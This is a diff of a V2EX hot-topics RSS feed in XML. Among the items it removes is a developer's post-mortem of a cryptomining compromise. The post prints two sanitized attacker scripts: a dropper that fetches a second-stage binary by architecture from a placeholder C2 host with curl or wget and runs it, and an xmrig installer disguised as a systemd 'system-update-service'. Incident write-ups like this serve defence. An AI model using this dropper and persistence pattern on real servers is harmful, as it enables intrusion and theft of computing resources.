@@ -4,7 +4,7 @@
     <title>V2EX Hot Topics</title>
     <link>https://www.v2ex.com/?tab=hot</link>
     <description>Hot topics from V2EX</description>
-    <lastBuildDate>Sun, 07 Dec 2025 05:10:43 GMT</lastBuildDate>
+    <lastBuildDate>Sun, 07 Dec 2025 05:38:09 GMT</lastBuildDate>
     <item>
       <title>外包转正？让我给遇到了</title>
       <link>https://www.v2ex.com/t/1177290</link>
@@ -36,62 +36,6 @@
       <pubDate>Sat, 06 Dec 2025 07:56:50 GMT</pubDate>
       <description>&lt;p&gt;我们厂，我见过挺多的，因为不给她们加班，她们吵到老板那里。&lt;/p&gt;
 &lt;p&gt;单休，一天 9.5 小时她们还不够，还要求让她们加班。&lt;/p&gt;
-</description>
-    </item>
-    <item>
-      <title>专业 A 股盘后复盘与深度分析桌面工具｜价值为基、趋势为策，现开放 1 个月免费体验</title>
-      <link>https://www.v2ex.com/t/1177266</link>
-      <guid>v2ex-1177266</guid>
-      <pubDate>Sat, 06 Dec 2025 05:35:25 GMT</pubDate>
-      <description>&lt;p&gt;平时做 A 股会有一个很普遍的痛点：&lt;br/&gt;
-行情软件很多，但要做一套&lt;strong&gt;有章可循的盘后复盘 + 个股深度分析&lt;/strong&gt;，往往需要在同花顺 / 东方财富 / 券商 APP / 各种网页之间来回切。数据是有的，但缺乏一套统一的&lt;strong&gt;投资理念与工作流&lt;/strong&gt;，效率很低。&lt;/p&gt;
-&lt;p&gt;我这边做的这个桌面应用，是一款专门面向 A 股中长期投资者的&lt;strong&gt;专业投资分析生产力工具&lt;/strong&gt;，定位很明确：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;不做交易终端，只做盘后复盘、热点追踪和深度分析。  &lt;/li&gt;
-&lt;li&gt;以「价值为基、趋势为策、风控优先」为核心理念。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;核心功能：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;盘后复盘看板&lt;/strong&gt;：市场总览、资金流向、行业资金、市场主线，一屏掌握市场全貌
-&lt;img alt=&quot;dashboard.png - 看板界面截图&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://tradersignal.org//imgs/dashboard.png&quot;/&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;热点发现&lt;/strong&gt;：行业/概念热力图，多维度指标可视化，盘后结构梳理
-&lt;img alt=&quot;dashboard.png - 看板界面截图&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://tradersignal.org//imgs/hotmap.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;dashboard.png - 看板界面截图&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://tradersignal.org//imgs/topic-library.png&quot;/&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;智能筛选器&lt;/strong&gt;：个股/ETF 多维度筛选，围绕「安全边际 + 趋势共振 + 组合稳健」设计
-&lt;img alt=&quot;dashboard.png - 看板界面截图&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://tradersignal.org//imgs/etf-screener.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;dashboard.png - 看板界面截图&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://tradersignal.org//imgs/stock-screener.png&quot;/&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;个股深度分析&lt;/strong&gt;：安全边际评估、趋势共振分析、财务画像、股东研究、十年业绩等全方位分析
-&lt;img alt=&quot;dashboard.png - 看板界面截图&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://tradersignal.org//imgs/stock-analysis.png&quot;/&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;产品定位：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;不是同花顺/东方财富的平替 —— 不做实时交易，只聚焦盘后复盘与深度研究&lt;/li&gt;
-&lt;li&gt;不是雪球那类社区 —— 没有信息流和情绪干扰，只提供数据和分析&lt;/li&gt;
-&lt;li&gt;不是量化平台 —— 不需要写代码，面向希望「提高分析效率」的中长期投资者&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;目标用户：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;有自己的一套价值/趋势框架，希望&lt;strong&gt;标准化复盘流程&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;以 &lt;strong&gt;1–3 个月波段 + 1–5 年价值投资&lt;/strong&gt; 为主&lt;/li&gt;
-&lt;li&gt;更在乎&lt;strong&gt;安全边际、企业质量、组合稳健&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;限时活动：1 个月免费体验版&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;完整功能可用，无需绑定支付方式&lt;/li&gt;
-&lt;li&gt;体验期结束不自动扣费&lt;/li&gt;
-&lt;li&gt;欢迎愿意认真使用并反馈的朋友来试用&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;了解更多：&lt;/strong&gt;&lt;br/&gt;
-产品介绍和使用指南： &lt;a href=&quot;https://tradersignal.org/signal-client&quot; rel=&quot;nofollow&quot;&gt;https://tradersignal.org/signal-client&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;有兴趣可以在评论区留言，我会私信发送下载链接和激活方式（或留下联系邮箱 / TG / 微信等统一发放）。&lt;/p&gt;
 </description>
     </item>
     <item>
@@ -130,131 +74,6 @@ DEC 5th
 5 、开通美元、港币账号
 客服大概 1 小时左右就可以将你的姓名改成拼音，完成后就可以正常开通所有的 wise 外币账号了。正常注册过程非常平滑。下一步就可以想办法卡通 wise 的实体卡了。
 &lt;a href=&quot;https://imgur.com/a/8wAaX6S&quot; rel=&quot;nofollow&quot;&gt;https://imgur.com/a/8wAaX6S&lt;/a&gt;&lt;/p&gt;
-</description>
-    </item>
-    <item>
-      <title>React 漏洞中招，服务器被用来挖矿</title>
-      <link>https://www.v2ex.com/t/1177265</link>
-      <guid>v2ex-1177265</guid>
-      <pubDate>Sat, 06 Dec 2025 05:31:34 GMT</pubDate>
-      <description>&lt;p&gt;早上收到阿里云短信，说有一台服务器被用来挖矿，排查发现哥们用漏洞来注入用于挖门罗币。
-做开发 12 年了第一次遇到服务器被人搞，说实话还有点刺激还有点兴奋。&lt;/p&gt;
-&lt;p&gt;复盘一下经过，大家共赏：&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;1 、收到阿里云报警说有服务器用于挖矿&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;2 、阿里云后台定位到了大致的挖矿文件&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;阿里云报警&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://i.imgur.com/BRn1L6j.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;3 、上服务器一看&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&quot;文件目录&quot; class=&quot;embedded_image&quot; loading=&quot;lazy&quot; referrerpolicy=&quot;no-referrer&quot; rel=&quot;noreferrer&quot; src=&quot;https://i.imgur.com/Z3f4Jgd.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;好家伙确实多了不少东西，有两个核心的攻击脚本，一个是 &lt;a href=&quot;http://python1.sh&quot; rel=&quot;nofollow&quot;&gt;python1.sh&lt;/a&gt; ，一个是 &lt;a href=&quot;http://sex.sh&quot; rel=&quot;nofollow&quot;&gt;sex.sh&lt;/a&gt; ，直接脱敏后放出脚本大家共赏：&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://python1.sh&quot; rel=&quot;nofollow&quot;&gt;python1.sh&lt;/a&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;#!/bin/bash
-
-# ========== 脱敏说明 ==========
-# 1. 攻击者 IP/端口替换为[攻击者 C2 服务器 IP:端口]
-# 2. 恶意程序随机文件名替换为[恶意程序随机文件名]
-# 3. 下载/执行类恶意逻辑添加注释，仅保留结构
-# 4. 核心攻击特征已标注，无任何可执行的恶意代码
-
-export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin
-mkdir -p /tmp
-cd /tmp
-touch /usr/local/bin/writeablex &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; cd /usr/local/bin/
-touch /usr/libexec/writeablex &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; cd /usr/libexec/
-touch /usr/bin/writeablex &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;amp; cd /usr/bin/
-rm -rf /usr/local/bin/writeablex /usr/libexec/writeablex /usr/bin/writeablex
-export PATH=$PATH:$(pwd)
-
-l64=&quot;[攻击者 C2 服务器 IP:端口]/?h=[C2_IP]&amp;amp;p=[端口]&amp;amp;t=tcp&amp;amp;a=l64&amp;amp;stage=true&quot;  # Linux x86_64 架构
-l32=&quot;[攻击者 C2 服务器 IP:端口]/?h=[C2_IP]&amp;amp;p=[端口]&amp;amp;t=tcp&amp;amp;a=l32&amp;amp;stage=true&quot;  # Linux x86 32 位架构
-a64=&quot;[攻击者 C2 服务器 IP:端口]/?h=[C2_IP]&amp;amp;p=[端口]&amp;amp;t=tcp&amp;amp;a=a64&amp;amp;stage=true&quot;  # ARM64 架构
-a32=&quot;[攻击者 C2 服务器 IP:端口]/?h=[C2_IP]&amp;amp;p=[端口]&amp;amp;t=tcp&amp;amp;a=a32&amp;amp;stage=true&quot;  # ARM32 架构
-
-v=&quot;[恶意程序随机文件名]&quot;
-rm -rf $v
-
-ARCH=$(uname -m)
-if [ ${ARCH}x = &quot;x86_64x&quot; ]; then
-    # (curl -fsSL -m180 $l64 -o $v||wget -T180 -q $l64 -O $v||python -c &#39;import urllib;urllib.urlretrieve(&quot;http://&#39;$l64&#39;&quot;, &quot;&#39;$v&#39;&quot;)&#39;)
-elif [ ${ARCH}x = &quot;i386x&quot; ]; then
-    # (curl -fsSL -m180 $l32 -o $v||wget -T180 -q $l32 -O $v||python -c &#39;import urllib;urllib.urlretrieve(&quot;http://&#39;$l32&#39;&quot;, &quot;&#39;$v&#39;&quot;)&#39;)
-elif [ ${ARCH}x = &quot;i686x&quot; ]; then
-    # (curl -fsSL -m180 $l32 -o $v||wget -T180 -q $l32 -O $v||python -c &#39;import urllib;urllib.urlretrieve(&quot;http://&#39;$l32&#39;&quot;, &quot;&#39;$v&#39;&quot;)&#39;)
-elif [ ${ARCH}x = &quot;aarch64x&quot; ]; then
-    # (curl -fsSL -m180 $a64 -o $v||wget -T180 -q $a64 -O $v||python -c &#39;import urllib;urllib.urlretrieve(&quot;http://&#39;$a64&#39;&quot;, &quot;&#39;$v&#39;&quot;)&#39;)
-elif [ ${ARCH}x = &quot;armv7lx&quot; ]; then
-    # (curl -fsSL -m180 $a32 -o $v||wget -T180 -q $a32 -O $v||python -c &#39;import urllib;urllib.urlretrieve(&quot;http://&#39;$a32&#39;&quot;, &quot;&#39;$v&#39;&quot;)&#39;)
-fi
-
-# chmod +x $v
-# (nohup $(pwd)/$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;) || (nohup ./$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;) || (nohup /usr/bin/$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;) || (nohup /usr/libexec/$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;) || (nohup /usr/local/bin/$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;) || (nohup /tmp/$v &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这个主要是为了下载第二层的恶意程序，从实际结果来看，恶意程序伪装成了 docker ，在 tmp 文件夹下跑，由于是二进制文件，目前还没有进一步查验它在做啥，不过大概率也是挖矿，因为看到了一个挖矿的 config 文件。&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://sex.sh&quot; rel=&quot;nofollow&quot;&gt;sex.sh&lt;/a&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;#!/bin/bash
-
-# ========== 脱敏说明 ==========
-# 1. 挖矿池地址/钱包 ID/TLS 指纹替换为占位符，无法用于实际挖矿；
-# 2. 下载/解压/执行类恶意命令全部注释，仅保留攻击结构；
-# 3. 服务器环境特征（如$(pwd)）替换为占位符，避免溯源风险；
-
-# Configuration
-TAR_FILE=&quot;kal.tar.gz&quot;
-EXTRACT_DIR=&quot;xmrig-6.24.0&quot;（ 6.24.0 ）
-BINARY_PATH=&quot;[当前路径]/$EXTRACT_DIR/xmrig&quot;
-ARGS=&quot;--url [恶意挖矿池地址] --user [攻击者挖矿钱包 ID] --pass next --donate-level 0 --tls --tls-fingerprint [恶意 TLS 指纹]&quot;
-SERVICE_NAME=&quot;system-update-service&quot;  
-
-# Download and setup if not already present
-if [ ! -f &quot;$BINARY_PATH&quot; ]; then
-    # curl -L -o &quot;$TAR_FILE&quot; --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot; https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-    # tar xvzf &quot;$TAR_FILE&quot;
-fi
-
-# chmod +x &quot;$BINARY_PATH&quot;
-
-# Attempt systemd setup
-INSTALLED_SYSTEMD=0
-if [ &quot;$(id -u)&quot; -eq 0 ] &amp;amp;&amp;amp; command -v systemctl &amp;gt;/dev/null 2&amp;gt;&amp;amp;1; then
-    echo &quot;Root privileges detected. Attempting systemd setup...&quot;
-    
-    SERVICE_FILE=&quot;/etc/systemd/system/${SERVICE_NAME}.service&quot;
-    
-    # cat &amp;lt;&amp;lt;EOF &amp;gt; &quot;$SERVICE_FILE&quot;
-    # [Unit]
-    # Description=System Update Service
-    # After=network.target
-    # 
-    # [Service]
-    # Type=simple
-    # ExecStart=${BINARY_PATH} ${ARGS}
-    # Restart=always
-    # RestartSec=10
-    # User=root
-    # 
-    # [Install]
-    # WantedBy=multi-user.target
-    # EOF
-
-    # systemctl daemon-reload
-    # systemctl enable &quot;$SERVICE_NAME&quot;
-    # systemctl start &quot;$SERVICE_NAME&quot;
-    
-    if systemctl is-active --quiet &quot;$SERVICE_NAME&quot;; then
-        echo &quot;Service started via systemd.&quot;
-        INSTALLED_SYSTEMD=1
-    fi
-fi
-
-# Fallback to nohup
-if [ $INSTALLED_SYSTEMD -eq 0 ]; then
-    echo &quot;Starting with nohup...&quot;
-    # nohup &quot;$BINARY_PATH&quot; $ARGS &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
-fi
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;是的你没看错，这个脚本甚至自带注释，甚至还 echo 了进度……不知道这个人从哪下的示例代码分发的……逻辑比较清晰，把挖矿程序伪装成系统服务。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;4 、处理&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;由于感染的服务器是公司很边缘的、用于内部一些脑洞项目 poc 测试的小服务器，所以在权限管理上十分松懈，直接用 root 用户部署的各类小 Demo App ，导致这次漏洞也轻松的让攻击者获得了 root 权限，可能还替换了部分系统文件，机器肯定是不能留了……&lt;/p&gt;
-&lt;p&gt;下一步排查一下上面在跑的服务，备份数据，销毁重建。&lt;/p&gt;
 </description>
     </item>
     <item>
@@ -305,6 +124,27 @@ fi
 今天加班用 uu 远程连回家里修图，
 远程修图工作流搞好了好耶！&lt;/p&gt;
 &lt;p&gt;图片放在下面的楼层里⬇️&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>老哥们咨询一下： Claude Code Max 的使用时长大概能用多久？</title>
+      <link>https://www.v2ex.com/t/1177285</link>
+      <guid>v2ex-1177285</guid>
+      <pubDate>Sat, 06 Dec 2025 08:40:37 GMT</pubDate>
+      <description>&lt;p&gt;现在在用 GitHub Copilot 的 Claude Opus ，体验非常棒。&lt;/p&gt;
+&lt;p&gt;想开一个 Claude Code Max 来做一些课余项目。&lt;/p&gt;
+&lt;p&gt;想问问已经开会员的老哥：Claude Code Max 的使用时长大概能用多久？&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>macbook air 24+512 和 mac mini 32+256 选择问题。。希望有大佬给个意见</title>
+      <link>https://www.v2ex.com/t/1177301</link>
+      <guid>v2ex-1177301</guid>
+      <pubDate>Sat, 06 Dec 2025 14:33:07 GMT</pubDate>
+      <description>&lt;p&gt;本人是 java 远程开发，现在手头上有一个 thinkpad x1 carbon 2019 ， 只有 16g 内存，开发打开多个 ide 以及网页后，非常卡&lt;/p&gt;
+&lt;p&gt;所以琢磨着换一个电脑，让开发体验好一些。现在纠结的是该买 mini 还是 air 。。。如果买 mini 的话， 出门就的带 thinkpad ，要经常切换环境。当然一周最多会乡里一天。频次不高。 买 air 的话，比较便捷，但担心 24g 不够用&lt;/p&gt;
+&lt;p&gt;现在国补后，mini 只要 5999 ，air 要 7399.预算最多就是这个了&lt;/p&gt;
+&lt;p&gt;求各位大佬推荐下。是否该上 air ，以及 24g 的内存是否够用&lt;/p&gt;
 </description>
     </item>
   </channel>
